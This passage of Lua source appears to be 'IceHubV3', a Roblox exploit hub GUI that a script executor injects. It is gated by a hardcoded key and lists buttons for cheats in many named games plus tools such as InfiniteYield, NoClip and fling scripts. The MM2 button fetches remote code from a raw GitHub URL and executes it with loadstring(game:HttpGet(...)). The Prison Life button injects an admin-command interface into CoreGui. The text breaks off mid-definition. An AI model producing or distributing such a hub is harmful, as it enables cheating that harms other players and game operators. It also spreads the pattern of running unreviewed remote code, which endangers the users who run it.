-- IceHubV3Gui[By XGL1CH]
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Launcher = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local LWelcome = Instance.new("TextLabel")
local keypls = Instance.new("TextLabel")
local KTB = Instance.new("TextBox")
local LB = Instance.new("TextButton")
local V1By = Instance.new("TextLabel")
local Main = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local Buttons = Instance.new("Frame")
local UICorner_3 = Instance.new("UICorner")
local HomeButton = Instance.new("TextButton")
local CreditsButton = Instance.new("TextButton")
local ScriptsButton = Instance.new("TextButton")
local HubsButton = Instance.new("TextButton")
local IceHubPic = Instance.new("ImageLabel")
local Home = Instance.new("Frame")
local PlayerImage = Instance.new("ImageLabel")
local UICorner_4 = Instance.new("UICorner")
local PlayerName = Instance.new("TextLabel")
local WelcomeHome = Instance.new("TextLabel")
local Credits = Instance.new("Frame")
local DeveloperPic = Instance.new("ImageLabel")
local UICorner_5 = Instance.new("UICorner")
local CoDeveloper = Instance.new("TextLabel")
local Developer = Instance.new("TextLabel")
local CloseButton = Instance.new("TextButton")
local UICorner_6 = Instance.new("UICorner")
local Scripts = Instance.new("ScrollingFrame")
local MM2 = Instance.new("TextButton")
local UICorner_7 = Instance.new("UICorner")
local PrisonLife = Instance.new("TextButton")
local UICorner_8 = Instance.new("UICorner")
local Breakin = Instance.new("TextButton")
local UICorner_9 = Instance.new("UICorner")
local BABFT = Instance.new("TextButton")
local UICorner_10 = Instance.new("UICorner")
local Arsenal = Instance.new("TextButton")
local UICorner_11 = Instance.new("UICorner")
local SpeedRun4 = Instance.new("TextButton")
local UICorner_12 = Instance.new("UICorner")
local RoGhoul = Instance.new("TextButton")
local UICorner_13 = Instance.new("UICorner")
local SAKTK = Instance.new("TextButton")
local UICorner_14 = Instance.new("UICorner")
local AdoptMe = Instance.new("TextButton")
local UICorner_15 = Instance.new("UICorner")
local NinjaLegends = Instance.new("TextButton")
local UICorner_16 = Instance.new("UICorner")
local RoCitizens = Instance.new("TextButton")
local UICorner_17 = Instance.new("UICorner")
local MeepCity = Instance.new("TextButton")
local UICorner_18 = Instance.new("UICorner")
local NerfFPS = Instance.new("TextButton")
local UICorner_19 = Instance.new("UICorner")
local SharkBite = Instance.new("TextButton")
local UICorner_20 = Instance.new("UICorner")
local Islands = Instance.new("TextButton")
local UICorner_21 = Instance.new("UICorner")
local CounterBlox = Instance.new("TextButton")
local UICorner_22 = Instance.new("UICorner")
local FNF = Instance.new("TextButton")
local UICorner_23 = Instance.new("UICorner")
local RagdollEngine = Instance.new("TextButton")
local UICorner_24 = Instance.new("UICorner")
local Strucid = Instance.new("TextButton")
local UICorner_25 = Instance.new("UICorner")
local AmongstUs = Instance.new("TextButton")
local UICorner_26 = Instance.new("UICorner")
local BPB = Instance.new("TextButton")
local UICorner_27 = Instance.new("UICorner")
local DDay = Instance.new("TextButton")
local UICorner_28 = Instance.new("UICorner")
local FTF = Instance.new("TextButton")
local UICorner_29 = Instance.new("UICorner")
local HASE = Instance.new("TextButton")
local UICorner_30 = Instance.new("UICorner")
local RoBeats = Instance.new("TextButton")
local UICorner_31 = Instance.new("UICorner")
local BloxBurg = Instance.new("TextButton")
local UICorner_32 = Instance.new("UICorner")
local BreakingPoint = Instance.new("TextButton")
local UICorner_33 = Instance.new("UICorner")
local SoundSpace = Instance.new("TextButton")
local UICorner_34 = Instance.new("UICorner")
local BedWars = Instance.new("TextButton")
local UICorner_35 = Instance.new("UICorner")
local Assasin = Instance.new("TextButton")
local UICorner_36 = Instance.new("UICorner")
local InfiniteJump = Instance.new("TextButton")
local UICorner_37 = Instance.new("UICorner")
local BigHeadV3 = Instance.new("TextButton")
local UICorner_38 = Instance.new("UICorner")
local InvisFling = Instance.new("TextButton")
local UICorner_39 = Instance.new("UICorner")
local FpsBoost = Instance.new("TextButton")
local UICorner_40 = Instance.new("UICorner")
local DoomSpire = Instance.new("TextButton")
local UICorner_41 = Instance.new("UICorner")
local Kat = Instance.new("TextButton")
local UICorner_42 = Instance.new("UICorner")
local FullBright = Instance.new("TextButton")
local UICorner_43 = Instance.new("UICorner")
local NoClip = Instance.new("TextButton")
local UICorner_44 = Instance.new("UICorner")
local WordBomb = Instance.new("TextButton")
local UICorner_45 = Instance.new("UICorner")
local ctrldel = Instance.new("TextButton")
local UICorner_46 = Instance.new("UICorner")
local MadCity = Instance.new("TextButton")
local UICorner_47 = Instance.new("UICorner")
local WalkWalls = Instance.new("TextButton")
local UICorner_48 = Instance.new("UICorner")
local Prevail = Instance.new("TextButton")
local UICorner_49 = Instance.new("UICorner")
local RevizAdmin = Instance.new("TextButton")
local UICorner_50 = Instance.new("UICorner")
local InfiniteYield = Instance.new("TextButton")
local UICorner_51 = Instance.new("UICorner")
local FateAdmin = Instance.new("TextButton")
local UICorner_52 = Instance.new("UICorner")
local Shattervast = Instance.new("TextButton")
local UICorner_53 = Instance.new("UICorner")
local Cmdx = Instance.new("TextButton")
local UICorner_54 = Instance.new("UICorner")
local Hubs = Instance.new("ScrollingFrame")
local EzHub = Instance.new("TextButton")
local UICorner_55 = Instance.new("UICorner")
local DomainHubV2 = Instance.new("TextButton")
local UICorner_56 = Instance.new("UICorner")
local Fanthom = Instance.new("TextButton")
local UICorner_57 = Instance.new("UICorner")
local AI = Instance.new("TextButton")
local UICorner_58 = Instance.new("UICorner")
local CocoHub = Instance.new("TextButton")
local UICorner_59 = Instance.new("UICorner")
local Impulse = Instance.new("TextButton")
local UICorner_60 = Instance.new("UICorner")
local Duck = Instance.new("TextButton")
local UICorner_61 = Instance.new("UICorner")
local Dark = Instance.new("TextButton")
local UICorner_62 = Instance.new("UICorner")
local Bruh = Instance.new("TextButton")
local UICorner_63 = Instance.new("UICorner")
local Ree = Instance.new("TextButton")
local UICorner_64 = Instance.new("UICorner")
local Mhee = Instance.new("TextButton")
local UICorner_65 = Instance.new("UICorner")
local Owl = Instance.new("TextButton")
local UICorner_66 = Instance.new("UICorner")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Launcher.Name = "Launcher"
Launcher.Parent = ScreenGui
Launcher.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Launcher.Position = UDim2.new(0.288916558, 0, 0.301010072, 0)
Launcher.Size = UDim2.new(0, 339, 0, 196)
Launcher.Visible = true

UICorner.Parent = Launcher

LWelcome.Name = "LWelcome"
LWelcome.Parent = Launcher
LWelcome.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
LWelcome.BackgroundTransparency = 1.000
LWelcome.Position = UDim2.new(0, 0, 0.076530613, 0)
LWelcome.Size = UDim2.new(0, 339, 0, 32)
LWelcome.Font = Enum.Font.SciFi
LWelcome.Text = "Welcome To IceHubV3!"
LWelcome.TextColor3 = Color3.fromRGB(0, 170, 255)
LWelcome.TextScaled = true
LWelcome.TextSize = 14.000
LWelcome.TextWrapped = true

keypls.Name = "keypls"
keypls.Parent = Launcher
keypls.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
keypls.BackgroundTransparency = 1.000
keypls.Position = UDim2.new(0, 0, 0.239795923, 0)
keypls.Size = UDim2.new(0, 339, 0, 27)
keypls.Font = Enum.Font.SciFi
keypls.Text = "Please Enter The Key"
keypls.TextColor3 = Color3.fromRGB(0, 170, 255)
keypls.TextScaled = true
keypls.TextSize = 14.000
keypls.TextWrapped = true

KTB.Name = "KTB"
KTB.Parent = Launcher
KTB.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
KTB.BorderColor3 = Color3.fromRGB(0, 170, 255)
KTB.BorderSizePixel = 2
KTB.Position = UDim2.new(0.203539819, 0, 0.459183753, 0)
KTB.Size = UDim2.new(0, 200, 0, 22)
KTB.Font = Enum.Font.SciFi
KTB.Text = "Enter The Key Here"
KTB.TextColor3 = Color3.fromRGB(0, 0, 0)
KTB.TextSize = 14.000
KTB.TextXAlignment = Enum.TextXAlignment.Left

LB.Name = "LB"
LB.Parent = Launcher
LB.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
LB.BorderColor3 = Color3.fromRGB(0, 170, 255)
LB.BorderSizePixel = 2
LB.Position = UDim2.new(0.37758112, 0, 0.617347002, 0)
LB.Size = UDim2.new(0, 82, 0, 19)
LB.Font = Enum.Font.SciFi
LB.Text = "Launch"
LB.TextColor3 = Color3.fromRGB(0, 0, 0)
LB.TextScaled = true
LB.TextSize = 14.000
LB.TextWrapped = true
LB.MouseButton1Click:connect(function()
	if KTB.Text == "183183183" then
		Main.Visible = true
		Launcher.Visible = false
end		
end)

V1By.Name = "V1 By"
V1By.Parent = Launcher
V1By.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
V1By.BackgroundTransparency = 1.000
V1By.Position = UDim2.new(0.203539819, 0, 0.948979676, 0)
V1By.Size = UDim2.new(0, 200, 0, 10)
V1By.Font = Enum.Font.SourceSans
V1By.Text = "V3 By XGL1CH"
V1By.TextColor3 = Color3.fromRGB(255, 255, 255)
V1By.TextScaled = true
V1By.TextSize = 14.000
V1By.TextWrapped = true

Main.Name = "Main"
Main.Parent = ScreenGui
Main.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Main.Position = UDim2.new(0.259028643, 0, 0.26060605, 0)
Main.Size = UDim2.new(0, 387, 0, 237)
Main.Visible = false

UICorner_2.Parent = Main

Buttons.Name = "Buttons"
Buttons.Parent = Main
Buttons.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Buttons.Size = UDim2.new(0, 88, 0, 237)

UICorner_3.Parent = Buttons

HomeButton.Name = "HomeButton"
HomeButton.Parent = Buttons
HomeButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
HomeButton.BorderColor3 = Color3.fromRGB(0, 170, 255)
HomeButton.BorderSizePixel = 2
HomeButton.Position = UDim2.new(0.0681818128, 0, 0.367088586, 0)
HomeButton.Size = UDim2.new(0, 76, 0, 27)
HomeButton.Font = Enum.Font.SciFi
HomeButton.Text = "Home"
HomeButton.TextColor3 = Color3.fromRGB(0, 0, 0)
HomeButton.TextSize = 14.000
HomeButton.MouseButton1Click:connect(function()
	Home.Visible = true
	Scripts.Visible = false
	Credits.Visible = false
	Hubs.Visible = false
end)


CreditsButton.Name = "CreditsButton"
CreditsButton.Parent = Buttons
CreditsButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CreditsButton.BorderColor3 = Color3.fromRGB(0, 170, 255)
CreditsButton.BorderSizePixel = 2
CreditsButton.Position = UDim2.new(0.0681818128, 0, 0.818565369, 0)
CreditsButton.Size = UDim2.new(0, 76, 0, 27)
CreditsButton.Font = Enum.Font.SciFi
CreditsButton.Text = "Credits"
CreditsButton.TextColor3 = Color3.fromRGB(0, 0, 0)
CreditsButton.TextSize = 14.000
CreditsButton.MouseButton1Click:connect(function()
	Home.Visible = false
	Scripts.Visible = false
	Credits.Visible = true
	Hubs.Visible = false
end)

ScriptsButton.Name = "ScriptsButton"
ScriptsButton.Parent = Buttons
ScriptsButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScriptsButton.BorderColor3 = Color3.fromRGB(0, 170, 255)
ScriptsButton.BorderSizePixel = 2
ScriptsButton.Position = UDim2.new(0.0681818128, 0, 0.518987298, 0)
ScriptsButton.Size = UDim2.new(0, 76, 0, 27)
ScriptsButton.Font = Enum.Font.SciFi
ScriptsButton.Text = "Scripts"
ScriptsButton.TextColor3 = Color3.fromRGB(0, 0, 0)
ScriptsButton.TextSize = 14.000
ScriptsButton.MouseButton1Click:connect(function()
	Home.Visible = false
	Scripts.Visible = true
	Credits.Visible = false
	Hubs.Visible = false
end)

HubsButton.Name = "HubsButton"
HubsButton.Parent = Buttons
HubsButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
HubsButton.BorderColor3 = Color3.fromRGB(0, 170, 255)
HubsButton.BorderSizePixel = 2
HubsButton.Position = UDim2.new(0.0681818128, 0, 0.67088604, 0)
HubsButton.Size = UDim2.new(0, 76, 0, 27)
HubsButton.Font = Enum.Font.SciFi
HubsButton.Text = "Hubs"
HubsButton.TextColor3 = Color3.fromRGB(0, 0, 0)
HubsButton.TextSize = 14.000
HubsButton.MouseButton1Click:connect(function()
	Home.Visible = false
	Scripts.Visible = false
	Credits.Visible = false
	Hubs.Visible = true
end)

IceHubPic.Name = "IceHubPic"
IceHubPic.Parent = Buttons
IceHubPic.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
IceHubPic.BackgroundTransparency = 1.000
IceHubPic.Position = UDim2.new(0.159090906, 0, 0.0590717271, 0)
IceHubPic.Size = UDim2.new(0, 60, 0, 60)
IceHubPic.Image = "http://www.roblox.com/asset/?id=9277561752"

Home.Name = "Home"
Home.Parent = Main
Home.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Home.Position = UDim2.new(0.255813956, 0, 0.122362867, 0)
Home.Size = UDim2.new(0, 259, 0, 192)

PlayerImage.Name = "PlayerImage"
PlayerImage.Parent = Home
PlayerImage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
PlayerImage.Position = UDim2.new(0.065637067, 0, 0.109375, 0)
PlayerImage.Size = UDim2.new(0, 73, 0, 73)
PlayerImage.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"

UICorner_4.CornerRadius = UDim.new(0, 100)
UICorner_4.Parent = PlayerImage

PlayerName.Name = "PlayerName"
PlayerName.Parent = Home
PlayerName.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
PlayerName.BackgroundTransparency = 1.000
PlayerName.Position = UDim2.new(0.432432413, 0, 0.166666672, 0)
PlayerName.Size = UDim2.new(0, 122, 0, 50)
PlayerName.Font = Enum.Font.SciFi
PlayerName.Text = "Name"
PlayerName.TextColor3 = Color3.fromRGB(0, 170, 255)
PlayerName.TextScaled = true
PlayerName.TextSize = 14.000
PlayerName.TextWrapped = true

WelcomeHome.Name = "WelcomeHome"
WelcomeHome.Parent = Home
WelcomeHome.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
WelcomeHome.BackgroundTransparency = 1.000
WelcomeHome.Position = UDim2.new(0, 0, 0.567708313, 0)
WelcomeHome.Size = UDim2.new(0, 259, 0, 83)
WelcomeHome.Font = Enum.Font.SciFi
WelcomeHome.Text = "Wellcome To IceHubV3!"
WelcomeHome.TextColor3 = Color3.fromRGB(0, 170, 255)
WelcomeHome.TextScaled = true
WelcomeHome.TextSize = 14.000
WelcomeHome.TextWrapped = true

Credits.Name = "Credits"
Credits.Parent = Main
Credits.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Credits.Position = UDim2.new(0.258397937, 0, 0.101265818, 0)
Credits.Size = UDim2.new(0, 261, 0, 188)
Credits.Visible = false

DeveloperPic.Name = "DeveloperPic"
DeveloperPic.Parent = Credits
DeveloperPic.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
DeveloperPic.Position = UDim2.new(0.360153258, 0, 0.388297856, 0)
DeveloperPic.Size = UDim2.new(0, 73, 0, 73)
DeveloperPic.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"

UICorner_5.CornerRadius = UDim.new(0, 100)
UICorner_5.Parent = DeveloperPic

CoDeveloper.Name = "CoDeveloper"
CoDeveloper.Parent = Credits
CoDeveloper.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CoDeveloper.BackgroundTransparency = 1.000
CoDeveloper.Position = UDim2.new(0, 0, 0.127659574, 0)
CoDeveloper.Size = UDim2.new(0, 261, 0, 26)
CoDeveloper.Font = Enum.Font.SciFi
CoDeveloper.Text = "CoDeveloper : XGL1CH"
CoDeveloper.TextColor3 = Color3.fromRGB(0, 170, 255)
CoDeveloper.TextScaled = true
CoDeveloper.TextSize = 14.000
CoDeveloper.TextWrapped = true

Developer.Name = "Developer"
Developer.Parent = Credits
Developer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Developer.BackgroundTransparency = 1.000
Developer.Size = UDim2.new(0, 261, 0, 26)
Developer.Font = Enum.Font.SciFi
Developer.Text = "Developer : Ice"
Developer.TextColor3 = Color3.fromRGB(0, 170, 255)
Developer.TextScaled = true
Developer.TextSize = 14.000
Developer.TextWrapped = true

CloseButton.Name = "CloseButton"
CloseButton.Parent = Main
CloseButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CloseButton.Position = UDim2.new(0.912144721, 0, 0.0337552726, 0)
CloseButton.Size = UDim2.new(0, 27, 0, 27)
CloseButton.Font = Enum.Font.SourceSans
CloseButton.Text = "X"
CloseButton.TextColor3 = Color3.fromRGB(0, 0, 0)
CloseButton.TextSize = 16.000
CloseButton.TextWrapped = true
CloseButton.MouseButton1Click:connect(function()
	Main.Visible = false
end)

UICorner_6.Parent = CloseButton

Scripts.Name = "Scripts"
Scripts.Parent = Main
Scripts.Active = true
Scripts.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Scripts.Position = UDim2.new(0.263565898, 0, 0.147679329, 0)
Scripts.Size = UDim2.new(0, 251, 0, 177)
Scripts.Visible = false
Scripts.CanvasSize = UDim2.new(0, 0, 5, 0)

MM2.Name = "MM2"
MM2.Parent = Scripts
MM2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MM2.Position = UDim2.new(0, 0, -0.000609687995, 0)
MM2.Size = UDim2.new(0, 71, 0, 50)
MM2.Font = Enum.Font.SciFi
MM2.Text = "MM2"
MM2.TextColor3 = Color3.fromRGB(0, 0, 0)
MM2.TextScaled = true
MM2.TextSize = 14.000
MM2.TextWrapped = true
MM2.MouseButton1Click:connect(function()
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/Ethanoj1/EclipseMM2/master/Script'),true))()
end)

UICorner_7.Parent = MM2

PrisonLife.Name = "PrisonLife"
PrisonLife.Parent = Scripts
PrisonLife.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
PrisonLife.Position = UDim2.new(0.282868534, 0, 0.0404592305, 0)
PrisonLife.Size = UDim2.new(0, 71, 0, 50)
PrisonLife.Font = Enum.Font.SciFi
PrisonLife.Text = "Prison Life"
PrisonLife.TextColor3 = Color3.fromRGB(0, 0, 0)
PrisonLife.TextScaled = true
PrisonLife.TextSize = 14.000
PrisonLife.TextWrapped = true
PrisonLife.MouseButton1Click:connect(function()
	local CmdGui = Instance.new("ScreenGui")
	local Background = Instance.new("Frame")
	local CmdName = Instance.new("TextLabel")
	local FindCmd = Instance.new("TextBox")
	local CmdHandler = Instance.new("ScrollingFrame")
	local CmdText = Instance.new("TextButton")
	local UIListLayout = Instance.new("UIListLayout")
	local Background2 = Instance.new("Frame")
	local Label = Instance.new("TextLabel")
	local Execute = Instance.new("TextBox")
	local Minimum = Instance.new("TextButton")
	local Close = Instance.new("TextButton")
	local Background3 = Instance.new("Frame")
	local Topbar = Instance.new("TextLabel")
	local CmdTitle = Instance.new("TextLabel")
	local Background4 = Instance.new("Frame")
	local Notify6 = Instance.new("TextLabel")
	local Notify5 = Instance.new("TextLabel")
	local Notify4 = Instance.new("TextLabel")
	local Notify3 = Instance.new("TextLabel")
	local Notify2 = Instance.new("TextLabel")
	local Notify1 = Instance.new("TextLabel")
	local CloseBar = Instance.new("TextButton")
	local TransparencyBar = Instance.new("TextButton")
	local Prefix = ";"

	CmdGui.Name = "CmdGui"
	CmdGui.Parent = game:GetService("CoreGui")
	CmdGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

	Background.Name = "Background"
	Background.Parent = CmdGui
	Background.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
	Background.BorderSizePixel = 0
	Background.Position = UDim2.new(0.368556708, 0, 0.11490047, 0)
	Background.Size = UDim2.new(0, 350, 0, 350)
	Background.Active = true
	Background.Draggable = true

	CmdName.Name = "CmdName"
	CmdName.Parent = Background
	CmdName.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
	CmdName.BorderSizePixel = 0
	CmdName.Size = UDim2.new(0, 350, 0, 25)
	CmdName.Font = Enum.Font.GothamBlack
	CmdName.Text = "Commands"
	CmdName.TextColor3 = Color3.fromRGB(255, 255, 255)
	CmdName.TextScaled = true
	CmdName.TextSize = 14.000
	CmdName.TextWrapped = true

	FindCmd.Name = "FindCmd"
	FindCmd.Parent = Background
	FindCmd.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
	FindCmd.BorderColor3 = Color3.fromRGB(0, 255, 0)
	FindCmd.BorderSizePixel = 0
	FindCmd.Position = UDim2.new(0.0714285746, 0, 0.0702347234, 0)
	FindCmd.Size = UDim2.new(0, 300, 0, 20)
	FindCmd.Font = Enum.Font.SourceSans
	FindCmd.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
	FindCmd.PlaceholderText = "Search For Command"
	FindCmd.Text = ""
	FindCmd.TextColor3 = Color3.fromRGB(255, 255, 255)
	FindCmd.TextSize = 14.000
	FindCmd.TextWrapped = true

	CmdHandler.Name = "CmdHandler"
	CmdHandler.Parent = Background
	CmdHandler.Active = true
	CmdHandler.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	CmdHandler.BackgroundTransparency = 1.000
	CmdHandler.BorderSizePixel = 0
	CmdHandler.AutomaticCanvasSize = "Y"
	CmdHandler.Position = UDim2.new(0.0714285746, 0, 0.142857149, 0)
	CmdHandler.Size = UDim2.new(0, 300, 0, 290)
	CmdHandler.ScrollBarThickness = 2

	CmdText.Name = "CmdText"
	CmdText.Parent = nil
	CmdText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	CmdText.BackgroundTransparency = 1.000
	CmdText.BorderSizePixel = 0
	CmdText.Size = UDim2.new(0, 300, 0, 25)
	CmdText.Font = Enum.Font.SourceSans
	CmdText.Text = "Text"
	CmdText.TextColor3 = Color3.fromRGB(255, 255, 255)
	CmdText.TextScaled = true
	CmdText.TextSize = 14.000
	CmdText.TextWrapped = true

	UIListLayout.Parent = CmdHandler
	UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

	Minimum.Name = "Minimum"
	Minimum.Parent = Background
	Minimum.BackgroundColor3 = Color3.fromRGB(0, 155, 155)
	Minimum.BorderSizePixel = 0
	Minimum.Position = UDim2.new(0.842857122, 0, 0.00571428565, 0)
	Minimum.Size = UDim2.new(0, 20, 0, 20)
	Minimum.Font = Enum.Font.SourceSans
	Minimum.Text = ""
	Minimum.TextColor3 = Color3.fromRGB(255, 255, 255)
	Minimum.TextSize = 14.000
	Minimum.MouseButton1Click:Connect(function()
		if Background.BackgroundTransparency == 0 then
			Background.BackgroundTransparency = 1
			Background.Size = UDim2.new(0, 350, 0, 25)
			FindCmd.Visible = false
			CmdHandler.Visible = false
		elseif Background.BackgroundTransparency == 1 then
			Background.BackgroundTransparency = 0
			Background.Size = UDim2.new(0, 350, 0, 350)
			FindCmd.Visible = true
			CmdHandler.Visible = true
		end
	end)

	Close.Name = "Close"
	Close.Parent = Background
	Close.BackgroundColor3 = Color3.fromRGB(155, 0, 0)
	Close.BorderSizePixel = 0
	Close.Position = UDim2.new(0.928571403, 0, 0.00571428565, 0)
	Close.Size = UDim2.new(0, 20, 0, 20)
	Close.Font = Enum.Font.SourceSans
	Close.Text = ""
	Close.TextColor3 = Color3.fromRGB(255, 255, 255)
	Close.TextSize = 14.000
	Close.MouseButton1Click:Connect(function()
		Background.Visible = false
	end)

	-- New

	Background2.Name = "Background"
	Background2.Parent = CmdGui
	Background2.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
	Background2.BorderSizePixel = 0
	Background2.Position = UDim2.new(0.012, 0, 0.807, 0)
	Background2.Size = UDim2.new(0, 250, 0, 80)
	Background2.Active = true
	Background2.Draggable = true

	Label.Name = "Label"
	Label.Parent = Background2
	Label.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
	Label.BorderSizePixel = 0
	Label.Position = UDim2.new(0, 0, 0, 0)
	Label.Size = UDim2.new(0, 250, 0, 25)
	Label.Font = Enum.Font.GothamBlack
	Label.Text = "Execute Bar"
	Label.TextColor3 = Color3.fromRGB(255, 255, 255)
	Label.TextScaled = true
	Label.TextSize = 14.000
	Label.TextWrapped = true

	Execute.Name = "Execute"
	Execute.Parent = Background2
	Execute.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
	Execute.BorderColor3 = Color3.fromRGB(0, 255, 0)
	Execute.Position = UDim2.new(0.097, 0, 0.436, 0)
	Execute.Size = UDim2.new(0, 200, 0, 30)
	Execute.Font = Enum.Font.SourceSans
	Execute.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
	Execute.PlaceholderText = "Press "..Prefix.." To Enter"
	Execute.Text = ""
	Execute.TextColor3 = Color3.fromRGB(255, 255, 255)
	Execute.TextSize = 16.000
	Execute.TextWrapped = true

	Background3.Name = "Background3"
	Background3.Parent = CmdGui
	Background3.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
	Background3.BorderSizePixel = 0
	Background3.Position = UDim2.new(0.306701034, 0, 0.288421065, 0)
	Background3.Size = UDim2.new(0, 200, 0, 100)
	Background3.Active = true
	Background3.Visible = false

	Topbar.Name = "Topbar"
	Topbar.Parent = Background3
	Topbar.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
	Topbar.BorderSizePixel = 0
	Topbar.Size = UDim2.new(0, 200, 0, 25)
	Topbar.Font = Enum.Font.GothamBlack
	Topbar.Text = ""
	Topbar.TextColor3 = Color3.fromRGB(255, 255, 255)
	Topbar.TextScaled = true
	Topbar.TextSize = 14.000
	Topbar.TextWrapped = true

	CmdTitle.Name = "CmdTitle"
	CmdTitle.Parent = Background3
	CmdTitle.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
	CmdTitle.BackgroundTransparency = 1.000
	CmdTitle.BorderSizePixel = 0
	CmdTitle.Position = UDim2.new(0.0500000007, 0, 0.379999995, 0)
	CmdTitle.Size = UDim2.new(0, 180, 0, 40)
	CmdTitle.Font = Enum.Font.GothamBlack
	CmdTitle.Text = ""
	CmdTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
	CmdTitle.TextSize = 14.000
	CmdTitle.TextWrapped = true

	Background4.Name = "Background4"
	Background4.Parent = CmdGui
	Background4.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
	Background4.BorderSizePixel = 0
	Background4.Position = UDim2.new(0.0154639352, 0, 0.519107938, 0)
	Background4.Size = UDim2.new(0, 250, 0, 119)
	Background4.Active = true
	Background4.Draggable = true

	Notify6.Name = "Notify6"
	Notify6.Parent = Background4
	Notify6.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
	Notify6.BackgroundTransparency = 1.000
	Notify6.BorderSizePixel = 0
	Notify6.Position = UDim2.new(0, 0, -0.00512820482, 0)
	Notify6.Size = UDim2.new(0, 250, 0, 20)
	Notify6.Font = Enum.Font.GothamBlack
	Notify6.Text = ""
	Notify6.TextColor3 = Color3.fromRGB(255, 255, 255)
	Notify6.TextScaled = true
	Notify6.TextSize = 14.000
	Notify6.TextWrapped = true

	Notify5.Name = "Notify5"
	Notify5.Parent = Background4
	Notify5.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
	Notify5.BackgroundTransparency = 1.000
	Notify5.BorderSizePixel = 0
	Notify5.Position = UDim2.new(0, 0, 0.162939027, 0)
	Notify5.Size = UDim2.new(0, 250, 0, 20)
	Notify5.Font = Enum.Font.GothamBlack
	Notify5.Text = ""
	Notify5.TextColor3 = Color3.fromRGB(255, 255, 255)
	Notify5.TextScaled = true
	Notify5.TextSize = 14.000
	Notify5.TextWrapped = true

	Notify4.Name = "Notify4"
	Notify4.Parent = Background4
	Notify4.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
	Notify4.BackgroundTransparency = 1.000
	Notify4.BorderSizePixel = 0
	Notify4.Position = UDim2.new(0, 0, 0.331006259, 0)
	Notify4.Size = UDim2.new(0, 250, 0, 20)
	Notify4.Font = Enum.Font.GothamBlack
	Notify4.Text = ""
	Notify4.TextColor3 = Color3.fromRGB(255, 255, 255)
	Notify4.TextScaled = true
	Notify4.TextSize = 14.000
	Notify4.TextWrapped = true

	Notify3.Name = "Notify3"
	Notify3.Parent = Background4
	Notify3.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
	Notify3.BackgroundTransparency = 1.000
	Notify3.BorderSizePixel = 0
	Notify3.Position = UDim2.new(0, 0, 0.499073505, 0)
	Notify3.Size = UDim2.new(0, 250, 0, 20)
	Notify3.Font = Enum.Font.GothamBlack
	Notify3.Text = ""
	Notify3.TextColor3 = Color3.fromRGB(255, 255, 255)
	Notify3.TextScaled = true
	Notify3.TextSize = 14.000
	Notify3.TextWrapped = true

	Notify2.Name = "Notify2"
	Notify2.Parent = Background4
	Notify2.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
	Notify2.BackgroundTransparency = 1.000
	Notify2.BorderSizePixel = 0
	Notify2.Position = UDim2.new(0, 0, 0.667140722, 0)
	Notify2.Size = UDim2.new(0, 250, 0, 20)
	Notify2.Font = Enum.Font.GothamBlack
	Notify2.Text = ""
	Notify2.TextColor3 = Color3.fromRGB(255, 255, 255)
	Notify2.TextScaled = true
	Notify2.TextSize = 14.000
	Notify2.TextWrapped = true

	Notify1.Name = "Notify1"
	Notify1.Parent = Background4
	Notify1.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
	Notify1.BackgroundTransparency = 1.000
	Notify1.BorderSizePixel = 0
	Notify1.Position = UDim2.new(0, 0, 0.835207999, 0)
	Notify1.Size = UDim2.new(0, 250, 0, 20)
	Notify1.Font = Enum.Font.GothamBlack
	Notify1.Text = ""
	Notify1.TextColor3 = Color3.fromRGB(255, 255, 255)
	Notify1.TextScaled = true
	Notify1.TextSize = 14.000
	Notify1.TextWrapped = true

	CloseBar.Name = "CloseBar"
	CloseBar.Parent = Background4
